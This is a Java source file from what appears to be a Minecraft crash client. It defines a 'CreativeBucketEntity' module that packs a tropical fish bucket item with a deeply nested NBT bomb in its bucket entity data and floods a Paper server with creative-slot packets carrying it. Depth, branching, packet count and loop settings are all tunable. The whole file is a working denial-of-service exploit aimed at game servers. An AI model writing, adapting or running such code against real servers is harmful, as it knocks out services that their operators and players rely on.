package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.module.impl.crash.NbtBombTrees;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataBucketEntityData;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;

public class CreativeBucketEntity extends Module {
	private ScheduledExecutorService executorService;

	public CreativeBucketEntity() {
		super("CreativeBucketEntity", "Paper creative-slot bucket_entity_data bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "50");
		addArgument("nbtDepth", ArgumentType.INT, 1, 48, "24");
		addArgument("branchSize", ArgumentType.INT, 1, 32, "8");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "5");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		DataComponents components = new DataComponents();
		components.put(new DataBucketEntityData(NbtBombTrees.entityBomb(
				context.getInt("nbtDepth"),
				context.getInt("branchSize"),
				"minecraft:tropical_fish"
		)));
		ItemStack item = new ItemStack(ItemType.TROPICAL_FISH_BUCKET.getId(protocol), 1, components);
		executorService = CreativeAttackHelper.start(
				this, context, executorService,
				context.getInt("packets"), context.getInt("threadSleep"), context.getInt("loopAmount"),
				context.getInt("slot"), item
		);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
